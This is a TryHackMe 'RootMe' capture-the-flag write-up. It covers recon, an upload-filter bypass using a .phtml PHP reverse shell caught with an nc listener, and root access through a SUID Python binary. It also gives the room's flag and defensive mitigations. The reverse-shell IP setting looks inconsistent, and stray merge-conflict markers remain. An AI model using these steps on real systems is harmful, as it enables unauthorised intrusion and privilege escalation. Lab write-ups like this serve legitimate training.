<p align="right">
  <sub>
    <b>Platform:</b> TryHackMe<br>
    <b>Difficulty:</b> Easy<br>
    <b>Status:</b> Completed ✅<br>
    <b>URL:</b> <a href="https://tryhackme.com/room/rrootme">RootMe</a><br>
    <b>Date:</b> Mar 03, 2026<br>
    <b>Tags:</b> #tryhackme #easy #machine #file-upload #suid #privilege-escalation
  </sub>
</p>

---

# RootMe

## 🧠 Overview

RootMe is a beginner-friendly Linux box built around two core concepts: file upload filter bypass and SUID binary abuse. The attack path is straightforward but teaches fundamentals that show up constantly in real engagements — weak extension filtering on an upload endpoint, and an interpreter left with SUID set. Both are trivially exploitable once identified. The whole chain from initial recon to root is clean and repeatable.

---

## 🎯 Objectives

- Discover a hidden file upload endpoint via directory brute-forcing
- Bypass file extension filtering to upload a PHP reverse shell
- Catch a reverse shell and stabilise the TTY
- Identify and abuse a SUID Python binary to escalate to root
- Retrieve `user.txt` and `root.txt`

---

## 🔍 Reconnaissance & Initial Analysis

Started with a service scan to map the attack surface:

```bash
nmap -sV 10.10.110.118
```

**Result:** Two services — SSH on 22 and Apache on 80. Web server is the obvious entry point.

Moved straight to directory brute-forcing to find anything interesting:

```bash
gobuster dir -u 10.10.110.118 -w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Key Finding:** `/uploads` directory exposed alongside a file upload panel. That's the foothold.

---

## ⚙️ Exploitation

Grabbed pentestmonkey's PHP reverse shell and updated the connection details:

```bash
# Edit the shell before uploading
$ip = '10.10.110.118';
$port = 9001;
```

Attempted a direct `.php` upload — server rejected it. The filter is blocking `.php` extensions. Classic blocklist approach, which means alternate extensions are worth trying immediately.

Renamed to `.phtml` — PHP still executes it, the filter doesn't catch it:

```bash
mv php_reverse_shell.php php_reverse_shell.phtml
```

**Result:** Upload succeeded.

Set up a listener:

```bash
nc -lvnp 9001
```

Navigated to `/uploads` in the browser and triggered the shell. Connection caught immediately.

Stabilised the TTY to get a usable shell:

```bash
which python
python -c 'import pty;pty.spawn("/bin/bash")'
```

Located the user flag:

```bash
find / -type f -name user.txt 2>/dev/null
```

---

## 🔐 Privilege Escalation

Standard enumeration — searched for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Critical Finding:** `/usr/bin/python` has the SUID bit set. Python with SUID is an instant root — GTFOBins covers this exactly.

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Result:** Root shell. The `-p` flag preserves the elevated EUID so privileges aren't dropped on spawn.

---

## 🏁 Flags / Proof

| Flag | Value |
|------|-------|
| Root Flag | `THM{pr1v1l3g3_3sca4l4ti0n}` |

---

## 🧩 Key Takeaways

- **Blocklist filtering is not enough** — if you're blocking `.php` but not `.phtml`, `.php5`, `.phar` etc. you're not actually filtering. Allowlist only the extensions you need.
- **SUID on interpreters is an instant game over** — Python, Perl, Ruby, Node with SUID all give trivial root. GTFOBins should be the first reference for any SUID finding.
- **Always check for SUID binaries early** — this should be a standard step in any Linux privilege escalation enumeration.

---

## ⛓️ Attack Chain Summary

1. Nmap scan reveals HTTP on port 80
2. Gobuster finds `/uploads` directory and file upload panel
3. Direct `.php` upload blocked by extension filter
4. Renamed to `.phtml` — filter bypassed, upload succeeds
5. Netcat listener set up, shell triggered from `/uploads`
6. TTY stabilised with Python pty
7. SUID enumeration flags `/usr/bin/python`
8. Python SUID exploited with `os.execl` to get root shell
9. Root flag retrieved

---

## 🔎 Detection Strategies

### Offensive Indicators
- `.phtml` or non-standard PHP extensions uploaded to web directories
- Outbound TCP connections from web server process
- Python spawning `/bin/sh` with `-p` flag
- `find` commands searching for SUID binaries

### Defensive Mitigations
- Replace extension blocklist with strict allowlist on upload endpoints
- Audit SUID binaries regularly — remove SUID from interpreters unless explicitly required
- Deploy web application firewall rules to detect reverse shell patterns
- Monitor outbound connections from web server processes

---

## 🛠️ Tools & References

| Tool | Purpose |
|------|---------|
| `nmap` | Port and service enumeration |
| `gobuster` | Web directory brute-forcing |
| [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP reverse shell payload |
| `netcat` | Reverse shell listener |
| [GTFOBins - Python](https://gtfobins.github.io/gtfobins/python/) | SUID Python privilege escalation reference |
<<<<<<< Updated upstream
-e 
=======
>>>>>>> Stashed changes

---

![](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExaDdhdmt6N2dhazFqbTdsdmk0ZThkdTBrYjBoOGdobWF2NzRmbXBjeCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/8kDPdrfdBUP8k/giphy.gif)
